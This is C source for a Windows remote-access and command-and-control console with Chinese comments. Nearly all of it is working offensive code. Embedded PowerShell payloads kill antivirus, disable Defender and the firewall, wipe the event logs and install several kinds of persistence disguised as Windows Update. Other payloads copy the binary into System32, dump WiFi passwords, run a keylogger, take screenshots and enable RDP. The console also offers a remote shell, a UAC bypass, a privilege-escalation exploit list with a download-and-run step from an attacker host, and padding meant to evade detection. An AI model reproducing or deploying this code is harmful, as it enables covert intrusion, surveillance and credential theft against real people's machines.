"$av=@('MsMpEng','HipsDaemon','360tray','360sd','knsdtray','QQPCTray','RavMonD');"
"Get-Process|Where-Object{$_.MainWindowHandle -ne 0}|ForEach-Object{"
"  $p=@((Get-CimInstance Win32_Process -Filter \"ProcessId=$($_.Id)\" -ErrorAction SilentlyContinue).ParentProcessId);"
"  $ok=1;$s|%{if($p-eq$_ -or $_.Id-eq$_){$ok=0}};if($ok){$null=$_.CloseMainWindow();Start-Sleep -Milliseconds 50}};"
"$av|%{Stop-Process -Name $_ -Force -ErrorAction SilentlyContinue}";

static const char *ps_killav =
"$av=@("
"'MsMpEng','NisSrv','SecurityHealthService','Sense','MpCmdRun','WinDefend',"
"'HipsDaemon','HipsTray','HipsLog','hips',"
"'360tray','360sd','360Safe','ZhuDongFangYu','QHSafeTray','QHScanner','QHActiveDefense',"
"'RavMonD','RavTask','RavMond','CCEVT','CCS','Rav',"
"'knsdtray','knsd','kavsvc','AVP','KAV','Kaspersky',"
"'QQPCTray','QQPCASrv','QPSafeSrv','QQPcSafe',"
"'SofEWS','SafeboxTray','V3Svc','ASRS','V3',"
"'McAPExe','McShield','McTray','mfevtp','McAfee',"
"'AvastSvc','AVGUI','ashDisp','AvastUI','Avast',"
"'egui','ekrn','ESET','ESET',"
"'bdagent','BDF','BDS','BitDefender',"
"'a2service','a2guard','A2FREE','AdAware',"
"'WRSA','WRSVC','WRSDA','Webroot',"
"'fsavgui','fsav32','F-Secure','fsma',"
"'Tbmon','tbsrv','TrendMicro','TM',"
"'PCCNT','PCCSRV','PavFnS','Panda',"
"'MBAMService','MbamPt','Malwarebytes',"
"'Avira','Antivir','avg','AVG',"
"'Comodo','CisSvc','cmdagent',"
"'DrWeb','DwEngine','dwservice',"
"'Fortinet','Forti','fmon',"
"'GData','GDScan','AVK',"
"'NOD32','Norton','Symantec','SemSvc','ccSvcHst',"
"'K7','K7Svc','QuickHeal','Rising','Sophos','SAV','SUPERAntiSpyware','TotalDefense','TrustPort','Vba32','VIPRE','ZoneAlarm');"
"$av|%{Stop-Process -Name $_ -Force -ErrorAction SilentlyContinue;Stop-Service -Name $_ -ErrorAction SilentlyContinue;sc.exe delete $_ 2>&1|Out-Null}";

static const char *ps_disable_defender =
"Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdate $true -DisableArchiveScanning $true -DisableCatchupFullScan $true -DisableCatchupQuickScan $true -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue;"
"@('HKLM\\Software\\Policies\\Microsoft\\Windows Defender','HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection')|%{New-Item -Path $_ -Force|Out-Null};"
"Set-ItemProperty -Path 'HKLM\\Software\\Policies\\Microsoft\\Windows Defender' -Name DisableAntiSpyware -Value 1 -Type DWord -Force;"
"Set-ItemProperty -Path 'HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force;"
"Stop-Service WinDefend -Force -ErrorAction SilentlyContinue;"
"sc.exe config WinDefend start=disabled 2>&1|Out-Null;"
"Write-Output '[+] Windows Defender disabled'";

static const char *ps_disable_firewall =
"netsh advfirewall set allprofiles state off 2>&1|Out-Null;"
"Stop-Service MpsSvc -Force -ErrorAction SilentlyContinue;"
"sc.exe config MpsSvc start=disabled 2>&1|Out-Null;"
"Write-Output '[+] Firewall disabled'";

static const char *ps_clearlogs =
"wevtutil el|ForEach-Object{wevtutil cl $_ 2>$null};"
"Remove-Item \"$env:WINDIR\\System32\\winevt\\Logs\\*.evtx\" -Force -ErrorAction SilentlyContinue;"
"Remove-Item \"$env:WINDIR\\Temp\\*\" -Recurse -Force -ErrorAction SilentlyContinue;"
"Write-Output '[+] Logs & temp cleared'";

static const char *ps_persist_reg =
"$exe=(Get-CimInstance Win32_Process -Filter \"ProcessId=$((Get-CimInstance Win32_Process -Filter \"ProcessId=$pid\"|Select-Object -ExpandProperty ParentProcessId))\").ExecutablePath;"
"$n='WindowsUpdate';$path=\"$env:LOCALAPPDATA\\$n\\$([System.IO.Path]::GetFileName($exe))\";"
"New-Item -Path \"$env:LOCALAPPDATA\\$n\" -ItemType Directory -Force -ErrorAction SilentlyContinue|Out-Null;"
"Copy-Item -Path $exe -Destination $path -Force;"
"New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name $n -Value $path -PropertyType String -Force|Out-Null;"
"Write-Output \"[+] Registry persistence: $path\"";

static const char *ps_persist_task =
"$exe=(Get-CimInstance Win32_Process -Filter \"ProcessId=$((Get-CimInstance Win32_Process -Filter \"ProcessId=$pid\"|Select-Object -ExpandProperty ParentProcessId))\").ExecutablePath;"
"$name='WindowsUpdateTask';"
"$a=New-ScheduledTaskAction -Execute $exe;$t=New-ScheduledTaskTrigger -AtStartup;"
"$s=New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;"
"$p=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited;"
"Register-ScheduledTask -TaskName $name -Action $a -Trigger $t -Settings $s -Principal $p -Force|Out-Null;"
"Write-Output \"[+] Task persistence: $name\"";

static const char *ps_persist_wmi =
"$exe=(Get-CimInstance Win32_Process -Filter \"ProcessId=$((Get-CimInstance Win32_Process -Filter \"ProcessId=$pid\"|Select-Object -ExpandProperty ParentProcessId))\").ExecutablePath;"
"$f='__EventFilter.Name=\"WinUpdateFilt\"';$c='CommandLineEventConsumer.Name=\"WinUpdateCons\"';"
"([wmiclass]'\\\\.\\root\\subscription:__EventFilter').CreateInstance()|%%{$_.QueryLanguage='WQL';$_.Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\";$_.Name='WinUpdateFilt';$_.EventNamespace='root\\cimv2';$_.Put()|Out-Null};"
"([wmiclass]'\\\\.\\root\\subscription:CommandLineEventConsumer').CreateInstance()|%%{$_.Name='WinUpdateCons';$_.CommandLineTemplate=$exe;$_.Put()|Out-Null};"
"([wmiclass]'\\\\.\\root\\subscription:__FilterToConsumerBinding').CreateInstance()|%%{$_.Filter=$f;$_.Consumer=$c;$_.Put()|Out-Null};"
"Write-Output '[+] WMI persistence installed'";

static const char *ps_persist_startup =
"$exe=(Get-CimInstance Win32_Process -Filter \"ProcessId=$((Get-CimInstance Win32_Process -Filter \"ProcessId=$pid\"|Select-Object -ExpandProperty ParentProcessId))\").ExecutablePath;"
"$s=(New-Object -ComObject WScript.Shell).CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.lnk\");"
"$s.TargetPath=$exe;$s.WindowStyle=7;$s.Save();"
"Write-Output '[+] Startup folder persistence'";

static const char *ps_elev_persist_svc =
"$exe=(Get-CimInstance Win32_Process -Filter \"ProcessId=$((Get-CimInstance Win32_Process -Filter \"ProcessId=$pid\"|Select-Object -ExpandProperty ParentProcessId))\").ExecutablePath;"
"$n='WindowsUpdateSvc';sc.exe create $n binPath=$exe start=auto DisplayName='Windows Update Service' 2>&1|Out-Null;"
"sc.exe description $n 'Provides Windows Update support' 2>&1|Out-Null;"
"sc.exe start $n 2>&1|Out-Null;"
"Write-Output \"[+] Service installed: $n\"";

static const char *ps_copy_sys32 =
"$r='abcdefghijklmnopqrstuvwxyz0123456789';"
"$n='';1..8|%{$n+=$r[(Get-Random -Maximum 36)]};"
"$m='';1..8|%{$m+=$r[(Get-Random -Maximum 36)]};"
"$ppid=(Get-CimInstance Win32_Process -Filter \"ProcessId=$pid\"|Select-Object -ExpandProperty ParentProcessId);"
"$exe=(Get-CimInstance Win32_Process -Filter \"ProcessId=$ppid\").ExecutablePath;"
"if(whoami /groups|findstr 'S-1-16-12288'){"
"  Copy-Item -Path $exe -Destination \"C:\\Windows\\System32\\$n.exe\" -Force;"
"  Copy-Item -Path $exe -Destination \"C:\\Windows\\System32\\$m.dll\" -Force;"
"  Write-Output \"[+] System32: $n.exe + $m.dll\"}else{Write-Output '[-] Not admin'}";

static const char *ps_copy_random =
"$r='abcdefghijklmnopqrstuvwxyz0123456789';"
"$n='';1..8|%{$n+=$r[(Get-Random -Maximum 36)]};$a='';1..8|%{$a+=$r[(Get-Random -Maximum 36)]};"
"$ppid=(Get-CimInstance Win32_Process -Filter \"ProcessId=$pid\"|Select-Object -ExpandProperty ParentProcessId);"
"$exe=(Get-CimInstance Win32_Process -Filter \"ProcessId=$ppid\").ExecutablePath;"
"New-Item -Path \"$env:ProgramData\\$a\" -ItemType Directory -Force -ErrorAction SilentlyContinue|Out-Null;"
"Copy-Item -Path $exe -Destination \"$env:ProgramData\\$a\\$n.exe\" -Force;"
"Copy-Item -Path $exe -Destination \"$env:TEMP\\$n.exe\" -Force;"
"Write-Output \"[+] Copied to ProgramData & TEMP\"";

static const char *ps_screenshot =
"Add-Type -AssemblyName System.Drawing;"
"$s=[Windows.Forms.Screen]::PrimaryScreen.Bounds;"
"$b=New-Object Drawing.Bitmap $s.Width,$s.Height;"
"$g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen(0,0,0,0,$s.Size);"
"$p=\"$env:TEMP\\sc_$(Get-Random).png\";$b.Save($p);$g.Dispose();$b.Dispose();"
"Write-Output \"[+] Screenshot: $p\"";

static const char *ps_wifi =
"netsh wlan show profiles|Select-String 'All User Profile'|%%{"
"  $p=$_-replace'.*:\\s+','';"
"  $k=netsh wlan show profile name=\"$p\" key=clear|Select-String'Key Content'|%%{$_-replace'.*:\\s+',''};"
"  Write-Output \"SSID: $p  Pass: $k\"}";

static const char *ps_netstat =
"netstat -ano|Select-String 'ESTABLISHED|LISTENING'|%%{Write-Output $_}";

static const char *ps_keylog_start =
"$g=@();Register-ObjectEvent -EventName 'KeyDown' -Action{$g+=$args[1].KeyCode;if($g.Count-ge100){$g-join''|Out-File \"$env:TEMP\\kl_$(Get-Date -Format yyyyMMdd_HHmmss).txt\" -Append;$g=@()}}|Out-Null;"
"Write-Output '[+] Keylogger started'";

static const char *ps_keylog_stop =
"Get-EventSubscriber|Unregister-Event -SubscriptionId $_.Id -Force -ErrorAction SilentlyContinue;"
"Write-Output '[-] Keylogger stopped'";

static const char *ps_enable_rdp =
"reg add 'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f 2>&1|Out-Null;"
"netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes 2>&1|Out-Null;"
"Write-Output '[+] RDP enabled'";

/* ====================================================================
 * 命令定义
 * ==================================================================== */
static void cmd_help(int,char**); static void cmd_connect(int,char**);
static void cmd_disconnect(int,char**); static void cmd_escalate(int,char**);
static void cmd_sysinfo(int,char**); static void cmd_ps(int,char**);
static void cmd_closewindows(int,char**); static void cmd_killav(int,char**);
static void cmd_disabledefender(int,char**); static void cmd_disablefirewall(int,char**);
static void cmd_clearlogs(int,char**); static void cmd_persist(int,char**);
static void cmd_copy(int,char**); static void cmd_rename(int,char**);
static void cmd_screenshot(int,char**); static void cmd_wifi(int,char**);
static void cmd_netstat(int,char**); static void cmd_keylog(int,char**);
static void cmd_enablerdp(int,char**); static void cmd_shell(int,char**);
static void cmd_sendcmd(int,char**); static void cmd_getsystem(int,char**);
static void cmd_lpe(int,char**); static void cmd_exit(int,char**);

static void tokenize(char *input, int *ac, char **av, int max) {
    *ac = 0; char *p = input;
    while (*p) {
        while (*p == ' ' || *p == '\t') p++; if (!*p) break;
        if (*ac >= max-1) break;
        if (*p == '"') { p++; av[*ac] = p; while (*p && *p != '"') p++; }
        else { av[*ac] = p; while (*p && *p != ' ' && *p != '\t') p++; }
        if (*p) { *p++ = 0; } (*ac)++;
    } av[*ac] = NULL;
}

static DWORD _hash_cmd(const char *s) {
    DWORD h = 5381; while (*s) { h = ((h << 5) + h) + (BYTE)(*s++); } return h;
}

static void exec_cmd(int ac, char **av) {
    if (ac == 0) return;
    DWORD h = _hash_cmd(av[0]);
    if (h == 0x7C97D2EE) cmd_help(ac, av);
    else if (h == 0xD3764DCF) cmd_connect(ac, av);
    else if (h == 0x82223B0F) cmd_disconnect(ac, av);
    else if (h == 0xBAC59370) cmd_sysinfo(ac, av);
    else if (h == 0x00597928) cmd_ps(ac, av);
    else if (h == 0x341C7587) cmd_escalate(ac, av);
    else if (h == 0xFC9A660A) cmd_getsystem(ac, av);
    else if (h == 0x0B888D26) cmd_lpe(ac, av);
    else if (h == 0x99903306) cmd_closewindows(ac, av);
    else if (h == 0x09201E48) cmd_killav(ac, av);
    else if (h == 0x37179156) cmd_disabledefender(ac, av);
    else if (h == 0x5F86F92F) cmd_disablefirewall(ac, av);
    else if (h == 0xF34C7261) cmd_clearlogs(ac, av);
    else if (h == 0xA523004F) cmd_persist(ac, av);
    else if (h == 0x7C954020) cmd_copy(ac, av);
    else if (h == 0x192CC41D) cmd_rename(ac, av);
    else if (h == 0x9A37F083) cmd_screenshot(ac, av);
    else if (h == 0x7CA01CD4) cmd_wifi(ac, av);
    else if (h == 0x0B52E448) cmd_netstat(ac, av);
    else if (h == 0x08DEDEF0) cmd_keylog(ac, av);
    else if (h == 0x82C4D672) cmd_enablerdp(ac, av);
    else if (h == 0x105AC57D) cmd_shell(ac, av);
    else if (h == 0x0B886679) cmd_sendcmd(ac, av);
    else if (h == 0x7C967E3F) cmd_exit(ac, av);
    else printf("Unknown: %s (type 'help')\n", av[0]);
}

/* ====================================================================
 * 命令实现
 * ==================================================================== */
static void cmd_help(int argc, char **argv) {
    printf("Commands:\n");
    printf("  %-20s %s\n", "help", "Show help");
    printf("  %-20s %s\n", "connect", "Connect to target");
    printf("  %-20s %s\n", "disconnect", "Disconnect");
    printf("  %-20s %s\n", "sysinfo", "System info");
    printf("  %-20s %s\n", "ps", "Process list");
    printf("  %-20s %s\n", "escalate", "UAC bypass");
    printf("  %-20s %s\n", "getsystem", "Full LPE probe");
    printf("  %-20s %s\n", "lpe", "Kernel exploits");
    printf("  %-20s %s\n", "closewindows", "Close windows");
    printf("  %-20s %s\n", "killav", "Kill AV");
    printf("  %-20s %s\n", "disabledefender", "Disable Defender");
    printf("  %-20s %s\n", "disablefirewall", "Disable firewall");
    printf("  %-20s %s\n", "clearlogs", "Clear logs");
    printf("  %-20s %s\n", "persist", "Persistence");
    printf("  %-20s %s\n", "copy", "Copy self");
    printf("  %-20s %s\n", "rename", "Rename");
    printf("  %-20s %s\n", "screenshot", "Screenshot");
    printf("  %-20s %s\n", "wifi", "Dump WiFi");
    printf("  %-20s %s\n", "netstat", "Net connections");
    printf("  %-20s %s\n", "keylog", "Keylogger");
    printf("  %-20s %s\n", "enablerdp", "Enable RDP");
    printf("  %-20s %s\n", "shell", "Interactive shell");
    printf("  %-20s %s\n", "cmd", "Run command");
    printf("  %-20s %s\n", "exit", "Exit");
    printf("\nUsage: lpe upload http://<kali>/<cve>.exe\n");
}

static void cmd_connect(int argc, char **argv) {
    if (argc < 2) { printf("Usage: connect <ip> [port]\n"); return; }
    disconnect_all();
    g_sock = connect_to(argv[1], (argc > 2) ? atoi(argv[2]) : 54321);
    if (g_sock == INVALID_SOCKET) { printf("Failed.\n"); return; }
    strncpy(g_ip, argv[1], sizeof(g_ip)-1); g_port = (argc > 2) ? atoi(argv[2]) : 54321;
    printf("Connected to %s:%d\n", g_ip, g_port);
    char buf[2048]; recv_all(g_sock, buf, sizeof(buf));
    if (strlen(buf) > 0) printf("%s", buf);
}

static void cmd_disconnect(int argc, char **argv) { disconnect_all(); printf("Disconnected.\n"); }

static void cmd_escalate(int argc, char **argv) { try_escalate(); }

static void cmd_sysinfo(int argc, char **argv) {
    probe_os();
    xcmd(g_sock, ps_sysinfo);
}

static void cmd_ps(int argc, char **argv) { xcmd(g_sock, ps_pslist); }

static void cmd_closewindows(int argc, char **argv) { xcmd(g_sock, ps_closewindows); }

static void cmd_killav(int argc, char **argv) { xcmd(g_sock, ps_killav); }

static void cmd_disabledefender(int argc, char **argv) {
    if (g_elev != INVALID_SOCKET) elev_cmd(ps_disable_defender); else xcmd(g_sock, ps_disable_defender);
}

static void cmd_disablefirewall(int argc, char **argv) {
    if (g_elev != INVALID_SOCKET) elev_cmd(ps_disable_firewall); else xcmd(g_sock, ps_disable_firewall);
}

static void cmd_clearlogs(int argc, char **argv) {
    if (g_elev != INVALID_SOCKET) elev_cmd(ps_clearlogs); else xcmd(g_sock, ps_clearlogs);
}

static void cmd_persist(int argc, char **argv) {
    const char *t = (argc > 1) ? argv[1] : "reg";
    if (_stricmp(t,"reg")==0) xcmd(g_sock,ps_persist_reg);
    else if (_stricmp(t,"task")==0) xcmd(g_sock,ps_persist_task);
    else if (_stricmp(t,"startup")==0) xcmd(g_sock,ps_persist_startup);
    else if (_stricmp(t,"wmi")==0) xcmd(g_sock,ps_persist_wmi);
    else if (_stricmp(t,"service")==0) { if(g_elev!=INVALID_SOCKET) elev_cmd(ps_elev_persist_svc); else printf("Need admin.\n"); }
    else printf("Usage: persist <reg|task|startup|wmi|service>\n");
}

static void cmd_copy(int argc, char **argv) {
    xcmd(g_sock, ps_copy_random);
    if (g_elev != INVALID_SOCKET) elev_cmd(ps_copy_sys32); else xcmd(g_sock, ps_copy_sys32);
}

static void cmd_rename(int argc, char **argv) {
    const char *ps =
    "$r='abcdefghijklmnopqrstuvwxyz0123456789';$n='';1..8|%{$n+=$r[(Get-Random -Maximum 36)]};"
    "$ppid=(Get-CimInstance Win32_Process -Filter \"ProcessId=$pid\"|Select-Object -ExpandProperty ParentProcessId);"
    "$exe=(Get-CimInstance Win32_Process -Filter \"ProcessId=$ppid\").ExecutablePath;"
    "try{Copy-Item -Path $exe -Destination \"$env:TEMP\\$n.exe\" -Force;Write-Output \"[+] Backup: $env:TEMP\\$n.exe\"}catch{}";
    xcmd(g_sock, ps);
}

static void cmd_screenshot(int argc, char **argv) { xcmd(g_sock, ps_screenshot); }
static void cmd_wifi(int argc, char **argv) { xcmd(g_sock, ps_wifi); }
static void cmd_netstat(int argc, char **argv) { xcmd(g_sock, ps_netstat); }

static void cmd_keylog(int argc, char **argv) {
    const char *a = (argc > 1) ? argv[1] : "start";
    if (_stricmp(a,"start")==0) xcmd(g_sock,ps_keylog_start);
    else if (_stricmp(a,"stop")==0) xcmd(g_sock,ps_keylog_stop);
    else printf("Usage: keylog <start|stop>\n");
}

static void cmd_enablerdp(int argc, char **argv) {
    if (g_elev != INVALID_SOCKET) elev_cmd(ps_enable_rdp); else printf("Need admin.\n");
}

static void cmd_shell(int argc, char **argv) {
    if (g_sock == INVALID_SOCKET) { printf("Not connected.\n"); return; }
    printf("[*] Interactive PowerShell (exit to return)\n");
    char input[4096];
    while (1) {
        printf("PS> "); if (!fgets(input,sizeof(input),stdin)) break;
        int l=(int)strlen(input); if(l>0&&input[l-1]=='\n')input[l-1]=0;
        if(l>1&&input[l-2]=='\r')input[l-2]=0;
        if(strcmp(input,"exit")==0)break; if(strlen(input)==0)continue;
        xcmd(g_sock, input);
    }
}

static void cmd_sendcmd(int argc, char **argv) {
    if (argc < 2) {
        if (g_sock == INVALID_SOCKET) { printf("Not connected.\n"); return; }
        char input[4096]; printf("Enter command: ");
        if (!fgets(input,sizeof(input),stdin)) return;
        int l=(int)strlen(input); if(l>0&&input[l-1]=='\n')input[l-1]=0;
        if(l>1&&input[l-2]=='\r')input[l-2]=0; if(strlen(input)==0)return;
        xcmd(g_sock, input); return;
    }
    char cmd[SEND_BUF]="";
    for(int i=1;i<argc;i++){if(i>1)strncat(cmd," ",sizeof(cmd)-strlen(cmd)-1);strncat(cmd,argv[i],sizeof(cmd)-strlen(cmd)-1);}
    xcmd(g_sock, cmd);
}

/* lpe — 列出当前版本适用 exploit + 手动上传执行 */
static void cmd_lpe(int argc, char **argv) {
    if (g_build == 0) probe_os();
    printf("[*] Build: %d\n", g_build);
    if (argc > 1) {
        /* 尝试下载执行特定的 exploit */
        if (strcmp(argv[1], "upload") == 0 && argc > 2) {
            const char *url = argv[2];
            const char *name = (argc > 3) ? argv[3] : "lpe.exe";
            if (g_elev == INVALID_SOCKET) { printf("Need elevated shell.\n"); return; }
            do_lpe_upload(url, name);
            return;
        }
    }
    /* 列出版本对应 exploit 建议 */
    printf("[*] Known LPE exploits for this build:\n");
    if (g_build >= 19041) {
        printf("  CVE-2024-26229  — CSC 驱动 (Build 19041-22621)\n");
        printf("  CVE-2023-29336  — Win32k (Build 19041-22621)\n");
        printf("  CVE-2023-21768  — AFD (Build 19041-22621)\n");
        printf("  CVE-2022-21882  — Win32k (Build 19041-22000)\n");
        printf("  CVE-2021-1732   — Win32k (Build 19041)\n");
        printf("  CVE-2021-40449  — Win32k (Build 19041-22000)\n");
        printf("  CVE-2020-1054   — Win32k (Build 19041)\n");
        printf("  CVE-2020-0787   — BITS (Build 19041)\n");
        printf("  CVE-2021-36934  — HiveNightmare (Build 17763-19043)\n");
    } else if (g_build >= 17763) {
        printf("  CVE-2021-1732   — Win32k\n");
        printf("  CVE-2021-40449  — Win32k\n");
        printf("  CVE-2020-1054   — Win32k\n");
        printf("  CVE-2019-0808   — Win32k\n");
        printf("  CVE-2019-0859   — Win32k\n");
        printf("  CVE-2019-1458  — Win32k\n");
    } else {
        printf("  CVE-2019-0808  — Win32k\n");
        printf("  CVE-2018-8120  — Win32k\n");
        printf("  CVE-2018-8639  — Win32k\n");
        printf("  CVE-2018-8440  — ALPC\n");
        printf("  CVE-2017-0263  — Win32k\n");
    }
    printf("[*] Usage: lpe upload http://<attacker>/<cve>.exe\n");
}

static void cmd_exit(int argc, char **argv) { disconnect_all(); printf("Bye.\n"); exit(0); }

/* ====================================================================
 * Main
 * ==================================================================== */
int main() {
    decoy_init(); init_uac();
    printf("C2 Connector %s — Windows 10 LPE ready (type 'help')\n", C2_VERSION);
    char input[8192]; int ac; char *av[64];
    while (1) {
        printf(g_sock != INVALID_SOCKET ? "c2[%s:%d]> " : "c2> ", g_ip, g_port);
        if (!fgets(input, sizeof(input), stdin)) break;
        int l=(int)strlen(input); if(l>0&&input[l-1]=='\n')input[l-1]=0;
        if(l>1&&input[l-2]=='\r')input[l-2]=0; if(strlen(input)==0)continue;
        tokenize(input, &ac, av, 64); if (ac == 0) continue;
        exec_cmd(ac, av);
    }
    disconnect_all(); return 0;
}

/* 诱饵: 生成 IAT 入口 + 文件体积填充 */
static DWORD gDecoy;
static int decoy_init(void) {
    HANDLE h = GetProcessHeap(); if (h) gDecoy++;
    SYSTEM_INFO si; GetSystemInfo(&si); gDecoy += (DWORD)si.dwPageSize;
    return (int)gDecoy;
}
static BYTE _pad2[262144] = {1}; /* 256KB 填充 */